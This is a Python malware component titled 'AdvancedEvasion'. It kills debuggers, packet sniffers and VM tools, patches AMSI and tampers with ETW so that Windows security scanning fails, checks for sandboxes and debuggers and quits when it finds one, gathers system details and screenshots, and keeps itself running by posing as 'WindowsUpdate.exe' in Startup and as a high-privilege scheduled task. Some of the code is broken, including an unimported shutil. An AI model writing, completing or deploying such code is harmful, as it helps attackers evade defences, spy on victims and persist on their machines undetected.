import os
import sys
import ctypes
import psutil
import platform
import subprocess
import tempfile
from PIL import ImageGrab
import random
import time

class AdvancedEvasion:
    def __init__(self):
        self.blacklist_processes = [
            "procmon", "wireshark", "processhacker", "x32dbg", "x64dbg",
            "ollydbg", "idaq", "ida64", "immunitydebugger", "windbg",
            "joebox", "sandboxie", "vmware", "vbox", "virtualbox",
            "vboxtray", "vmusrvc", "vmsrvc", "prl_", "qemu", "xenservice"
        ]
        
        self.blacklist_users = ["sandbox", "virus", "malware", "analysis"]
        self.blacklist_hwids = ["00000000-0000-0000-0000-000000000000"]
    
    def kill_analysis_tools(self):
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                if any(blacklisted in proc_name for blacklisted in self.blacklist_processes):
                    proc.kill()
            except:
                pass
    
    def bypass_amsi_etw(self):
        try:
            amsi = ctypes.windll.amsi
            buf = ctypes.create_string_buffer(b"\x57" + b"\xc3")
            ctypes.windll.kernel32.VirtualProtect(amsi.AmsiScanBuffer, ctypes.c_size_t(2), 0x40, ctypes.byref(ctypes.c_ulong()))
            ctypes.windll.kernel32.WriteProcessMemory(-1, amsi.AmsiScanBuffer, buf, 2, None)
        except: pass
        try:
            ctypes.windll.ntdll.EtwEventWrite = ctypes.windll.ntdll.RtlCopyMemory
            ctypes.windll.ntdll.EtwEventWriteFull = ctypes.windll.ntdll.RtlCopyMemory
        except: pass
        try:
            ctypes.windll.wldp.WldpQueryDynamicCodeTrust = ctypes.windll.kernel32.GetProcAddress
        except: pass
    
    def detect_sandbox(self):
        checks = [
            self.check_cpu_cores(),
            self.check_ram_size(),
            self.check_disk_size(),
            self.check_running_time(),
            self.check_process_count(),
            self.check_debugger(),
            self.check_vm_artifacts(),
            self.check_sleep_acceleration()
        ]
        
        return sum(checks) >= 3  
    
    def check_cpu_cores(self):
        return psutil.cpu_count() < 2
    
    def check_ram_size(self):
        return psutil.virtual_memory().total < 2 * 1024**3  
    
    def check_disk_size(self):
        return psutil.disk_usage('/').total < 60 * 1024**3  
    
    def check_running_time(self):
        import time
        start_time = psutil.boot_time()
        current_time = time.time()
        return (current_time - start_time) < 300  
    
    def check_process_count(self):
        return len(list(psutil.process_iter())) < 50
    
    def check_debugger(self):
        return ctypes.windll.kernel32.IsDebuggerPresent() or \
               hasattr(sys, 'gettrace') and sys.gettrace() is not None
    
    def check_vm_artifacts(self):
        vm_indicators = 0
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower()
            if any(vm_proc in proc_name for vm_proc in ['vbox', 'vmware', 'vboxtray', 'vmacthlp']):
                vm_indicators += 1
        vm_files = [
            "C:\\Windows\\System32\\vmGuestLib.dll",
            "C:\\Windows\\System32\\vboxhook.dll",
            "C:\\Windows\\System32\\vm3dgl.dll"
        ]
        
        for file in vm_files:
            if os.path.exists(file):
                vm_indicators += 1
        
        return vm_indicators > 0
    
    def check_sleep_acceleration(self):
        start = time.time()
        time.sleep(2)
        end = time.time()
        
        return (end - start) < 1.5 
    
    def anti_debug(self):
        if self.check_debugger():
            sys.exit()
        try:
            ctypes.windll.kernel32.OutputDebugStringW("")
            if ctypes.windll.kernel32.GetLastError() != 0:
                sys.exit()
        except: pass
    
    def anti_vm(self):
        if self.detect_sandbox():
            sys.exit()
    
    def get_system_info(self):
        return {
            "hostname": platform.node(),
            "username": os.getenv("USERNAME"),
            "os": platform.platform(),
            "processor": platform.processor(),
            "ram_gb": f"{psutil.virtual_memory().total / (1024**3):.1f}",
            "architecture": platform.architecture()[0],
            "gpus": self.get_gpu_info()
        }
    
    def get_gpu_info(self):
        try:
            result = subprocess.check_output(["wmic", "path", "win32_VideoController", "get", "name"], shell=True)
            return result.decode('utf-8', errors='ignore').strip().split('\n')[1:]
        except:
            return ["Unknown"]
    
    def take_screenshots(self):
        screenshots = []
        try:
            for i in range(3): 
                screenshot = ImageGrab.grab()
                temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.png')
                screenshot.save(temp_file.name)
                screenshots.append(temp_file.name)
                time.sleep(0.5)
        except:
            pass
        return screenshots
    
    def add_to_startup(self):
        try:
            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            exe_path = sys.argv[0]
            
            if not exe_path.endswith('.exe'):
                return
            
            startup_exe = os.path.join(startup_path, 'WindowsUpdate.exe')
            shutil.copy2(exe_path, startup_exe)
        except:
            pass
    
    def create_scheduled_task(self):
        try:
            exe_path = os.path.abspath(sys.argv[0])
            task_name = "WindowsUpdateTask"
            
            cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass

def kill_analysis_tools():
    evasion = AdvancedEvasion()
    evasion.kill_analysis_tools()

def bypass_amsi_etw():
    evasion = AdvancedEvasion()
    evasion.bypass_amsi_etw()

def detect_sandbox():
    evasion = AdvancedEvasion()
    return evasion.detect_sandbox()

def anti_debug():
    evasion = AdvancedEvasion()
    evasion.anti_debug()

def anti_vm():
    evasion = AdvancedEvasion()
    evasion.anti_vm()

def get_system_info():
    evasion = AdvancedEvasion()
    return evasion.get_system_info()

def take_screenshots():
    evasion = AdvancedEvasion()
    return evasion.take_screenshots()

def add_to_startup():
    evasion = AdvancedEvasion()
    evasion.add_to_startup()

def create_scheduled_task():
    evasion = AdvancedEvasion()
    evasion.create_scheduled_task()